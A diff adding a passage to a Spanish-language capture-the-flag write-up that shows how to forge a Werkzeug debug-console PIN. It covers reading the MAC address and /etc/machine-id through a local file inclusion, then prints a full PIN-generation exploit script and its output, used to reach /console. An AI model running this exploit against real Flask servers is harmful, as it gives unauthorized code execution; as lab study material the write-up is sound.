@@ -334,4 +334,78 @@ Si vamos a ese directorio nos encontramos con que está bloqueado por un `PIN`.
 
 En la fase de reconocimiento hemos visto que el puerto 5000 tenía `Werkzeug` y en `hacktricks` hay un `exploit` para esa versión. Si a ese exploit le cambiamos un par de cosas y lo ejecutamos, nos debería dar un pin válido.
 
+Primero cambiaremos el user a `aas`.
 
+Luego cambiaremos la `versión de Python`:
+
+```
+'/usr/local/lib/python2.7/dist-packages/flask/app.pyc', # getattr(mod, '__file__', None),
+```
+
+Ahora cambiaremos la linea en `private bites`, este valor es dinámico, pero con hacer un lfi al directorio `/sys/class/net/ens33/address` ya lo tendríamos:
+
+```
+'345052400273', # str(uuid.getnode()),  /sys/class/net/ens33/address
+```
+
+El siguiente también es dinámico, pero con otro lfi a `/etc/machine-id` también lo tendríamos:
+
+```
+'258f132cd7e647caaf5510e3aca997c1', # get_machine_id(), /etc/machine-id
+```
+
+En mi caso el script quedaría asi, pero en tu caso tienes que cambiar los últimos dos valores a los tuyos, ya que son dinámicos:
+
+```
+import hashlib
+from itertools import chain
+probably_public_bits = [
+    'aas', # username
+    'flask.app', # modname
+    'Flask', # getattr(app, '__name__', getattr(app.__class__, '__name__'))
+    '/usr/local/lib/python2.7/dist-packages/flask/app.pyc' # getattr(mod, '__file__', None),
+]
+
+private_bits = [
+    '345052400273', # str(uuid.getnode()),  /sys/class/net/ens33/address
+    '258f132cd7e647caaf5510e3aca997c1' # get_machine_id(), /etc/machine-id
+]
+
+h = hashlib.md5()
+for bit in chain(probably_public_bits, private_bits):
+    if not bit:
+        continue
+    if isinstance(bit, str):
+        bit = bit.encode('utf-8')
+    h.update(bit)
+h.update(b'cookiesalt')
+#h.update(b'shittysalt')
+
+cookie_name = '__wzd' + h.hexdigest()[:20]
+
+num = None
+if num is None:
+    h.update(b'pinsalt')
+    num = ('%09d' % int(h.hexdigest(), 16))[:9]
+
+rv = None
+if rv is None:
+    for group_size in 5, 4, 3:
+        if len(num) % group_size == 0:
+            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
+                          for x in range(0, len(num), group_size))
+            break
+    else:
+        rv = num
+
+print(rv)
+```
+
+Ahora lo ejecutamos y ya nos debería dar un PIN valido:
+
+```
+❯ python3 exploit.py
+199-187-272
+```
+
+Y con este PIN logramos acceder a /console.
